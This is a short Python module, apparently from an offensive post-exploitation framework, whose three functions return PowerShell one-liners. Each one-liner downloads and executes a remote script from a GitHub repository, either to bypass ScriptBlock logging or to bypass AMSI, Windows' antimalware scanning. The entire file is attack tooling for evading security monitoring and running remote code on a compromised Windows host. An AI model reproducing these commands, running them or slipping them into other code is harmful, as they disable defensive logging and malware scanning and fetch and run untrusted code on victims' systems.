from __future__ import absolute_import
from . import helpers


def scriptBlockLogBypass():
    # ScriptBlock Logging bypass
    bypass = "iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/scriptblocklog.ps1');"
    return bypass


def AMSIBypass():
    # @mattifestation's AMSI bypass
    bypass = "iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsicustom.ps1')"
    return bypass



def AMSIBypass2():
    # Modified implementation of Tal Liberman's AMSI bypass
    bypass = "iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsi.ps1')"
    return bypass
